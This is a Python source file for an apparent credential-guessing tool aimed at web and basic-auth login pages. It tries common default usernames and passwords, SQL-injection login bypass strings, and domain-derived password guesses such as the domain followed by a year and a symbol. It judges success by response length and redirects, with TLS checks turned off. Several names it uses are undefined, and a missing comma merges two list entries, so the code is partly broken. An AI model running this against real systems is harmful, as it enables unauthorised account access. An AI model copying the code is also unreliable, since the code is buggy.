import requests
import argparse
import sys, os, re
import time

from config.color_config import INFO, found, not_found, action_not_found, action_found

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

UserAgent = {'User-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko'}


class all_default_tests:

    def default_user_as_pass(self, url, username_input=False, password_input=False, fc=False, nomessage=False, basic=False, cookie_=False):
        payl = ["admin", "adm" "administrateur", "test", "info", "root", "guest", "anonymous", "demo", "manager", "user", "dev", "a'or 1=1#", "a'or 1=1 or'"]

        account_found = False
        for p in payl:
            login = {username_input: p, password_input: p}
            req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_) if not basic else requests.post(url, auth=(p, p), verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
            
            if type(fc) != int:
                if len(req.text) != fc[0] and len(req.text) != fc[1] and req.status_code not in [401, 403]:
                    print("  {}Potentially account or username found: {}:{}".format(found, p, p))
                    account_found = True
                elif nomessage and nomessage not in req.text:
                    print("  {}Potentially account or username found: {}:{} [{}b]".format(found, p, p, len(req.content)))
                    account_found = True
            else:
                if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
                    print("  {}Potentially account or username found: {}:{}".format(found, p, p))
                    account_found = True
                elif nomessage and nomessage not in req.text:
                    print("  {}Potentially account or username found: {}:{} [{}b]".format(found, p, p, len(req.content)))
                    account_found = True
                elif len(req.text) not in range(fc - 300, fc + 300) and req.status_code not in [401, 403]:
                    print("  {}Account found: {}:{}".format(found, p, p))
                    if not urls_file:
                        sys.exit()
            
            #sys.stdout.write("\033[34{}: {} | {}: {}\033[0m\r".format(username_input, p, password_input, p))
            sys.stdout.write("\033[34{}\033[0m\r".format(login))
            sys.stdout.write("\033[K")
        return account_found


    def test_default_password(self, url, username_input, password_input, username, password, fc, nomessage, cookie_):
        """
        test_default_password: Test known default password
        """
        login = {username_input: username, password_input: password}
        req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_)
        if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
            print("  {}Potentially account or username found: {} [{}b]".format(found, login, fc))
        elif nomessage and nomessage not in req.text:
            print("  {}Potentially account or username found: {} [{}b]".format(found, login, fc))
        elif len(req.text) not in range(fc - 300, fc + 300) and req.status_code not in [401, 403]:
            print("  {}Account found: {}".format(found, login))
            if not urls_file:
                sys.exit()
            return True
        #sys.stdout.write("\033[34m{}: {} | {}: {}\033[0m\r".format(username_input, username, password_input, password))
        sys.stdout.write("\033[34{}\033[0m\r".format(login))
        sys.stdout.write("\033[K")


    def default_domain_test(self, url, domain, app_type, cookie_, nomessage=False, inputs=False):
        print(" {} Default domain test".format(INFO))

        #username_input, password_input, other_param, other_param_value = check_param(inputs)
        if app_type != "basic_auth":
            fc = first_check(url, username_input, password_input, other_param_value) if len(inputs.split(":")) > 2 else first_check(url, username_input, password_input)
        else:
            fc_r = requests.post(url, auth=("dzecefzrve", "dzecefzrve"), verify=False, allow_redirects=False, timeout=10)
            fc = len(fc_r.content)


        users = ["admin", "adm", "administrateur", "test", "root", "guest", "anonymous", "demo", "manager", "user", "info", domain] if not user_known else [user_default]

        dico_user_reuse = [
        "{}".format(domain), "{}@".format(domain),
        "{}2016".format(domain),"{}2017".format(domain),"{}2018".format(domain),"{}2019".format(domain),"{}2020".format(domain), "{}2021".format(domain), 
        "{}2022".format(domain), "{}2023".format(domain),
        "{}2016*".format(domain),"{}2017*".format(domain),"{}2018*".format(domain),"{}2019*".format(domain),"{}2020*".format(domain),"{}2021*".format(domain),
        "{}2022*".format(domain), "{}2023*".format(domain),
        "{}@2016".format(domain),"{}@2017".format(domain),"{}@2018".format(domain),"{}@2019".format(domain),"{}@2020".format(domain),"{}@2021".format(domain),
        "{}@2022".format(domain), "{}@2023".format(domain),
        "{}2016!".format(domain),"{}2017!".format(domain),"{}2018!".format(domain),"{}2019!".format(domain),"{}2020!".format(domain),"{}2021!".format(domain),
        "{}2022!".format(domain), "{}2023!".format(domain),
        "{}123".format(domain), "{}123!".format(domain), "{}@123!".format(domain), "{}@123*".format(domain)]
        for user in users:
            for passwd in dico_user_reuse:
                if app_type != "web":
                    req = requests.post(url, auth=(user, passwd), verify=False, allow_redirects=False, timeout=10)
                else:
                    datas = {username_input: user, password_input: passwd, other_param: other_param_value} if len(inputs.split(":")) > 2 else {username_input: user, password_input: passwd}
                    req = requests.post(url, data=datas, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_)
                if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
                    print("  {} Potentially account or username found: {}:{}".format(found, user, passwd))
                elif nomessage and nomessage not in req.text:
                    print("  {}Potentially account or username found: {} [{}b]".format(found, login, fc))
                elif len(req.text) not in range(fc - 300, fc + 300) and req.status_code not in [401, 403]:
                    print("  {} Account found: {}:{}".format(found, user, passw))
                    sys.exit()
                elif req.status_code in [301, 302]:
                    req2 = requests.post(url, data=datas, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_)
                    print(req2.headers.get("Location"))
                    if req2.headers.get("Location") != req.headers.get("Location"):
                        print("  {}Account found: {}:{}".format(found, user, passwd))
                if app_type != "basic_auth":
                    sys.stdout.write("\033[34m{}: {} | {}: {}\033[0m\r".format(username_input, user, password_input, passwd))
                    sys.stdout.write("\033[K")
                else:
                    sys.stdout.write("\033[34m{} | {}\033[0m\r".format(user, passwd))
                    sys.stdout.write("\033[K")
